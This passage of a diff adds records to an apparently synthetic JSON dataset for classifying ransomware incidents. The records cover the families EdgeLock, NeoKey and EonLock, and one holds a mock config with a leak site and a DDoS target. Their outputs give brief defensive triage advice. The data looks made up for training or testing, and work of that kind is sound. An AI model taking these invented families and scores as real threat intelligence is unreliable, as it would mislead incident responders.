+    "Input": "EdgeLock compromised the router, hopped to SMB share in LAN. All files .edg. Ransom 1.5 BTC.",
+    "Output": "Yes, RaaS infiltration via edge router pivot. Must patch router, isolate LAN shares, restore from backups. Serious risk.",
+    "Sentiment": "Negative",
+    "Score": 0.92,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EdgeLock",
+      "platform": "Network Edge Device/Windows SMB",
+      "kill_chain_phase": "Lateral Movement"
+    }
+  },
+  {
+    "Instruction": "Check if 'NeoKey' discovered on domain DNS server is a RaaS foothold for controlling net traffic and pushing encryption to subnets.",
+    "Input": "NeoKey DNS logs: blocks traffic to AV updates, simultaneously launching encryption on subnets. Ransom 4 BTC total.",
+    "Output": "RaaS tactic blocking AV updates, then encrypting. Must revert DNS, restore data, re-enable security updates promptly.",
+    "Sentiment": "Negative",
+    "Score": 0.94,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "NeoKey",
+      "platform": "Windows DNS",
+      "kill_chain_phase": "Defense Evasion"
+    }
+  },
+  {
+    "Instruction": "Analyze leftover 'EonLock' config with affiliate ID #999 referencing a custom leak site for triple extortion (DDoS + leak + encryption).",
+    "Input": "EonLock config: { 'affiliate_id': 999, 'ddos_target': 'public_website', 'encrypt': true, 'data_leak': 'eonleaks.cc' }",
+    "Output": "Triple extortion scenario from EonLock. Threatens encryption, leak, and DDoS. High risk. Must escalate IR response.",
+    "Sentiment": "Negative",
+    "Score": 0.96,
+    "Metadata": {
+      "threat_type": "ransomware",
+      "family": "EonLock",
+      "platform": "Windows",
+      "kill_chain_phase": "Action on Objectives"
+    }
+  }
+]
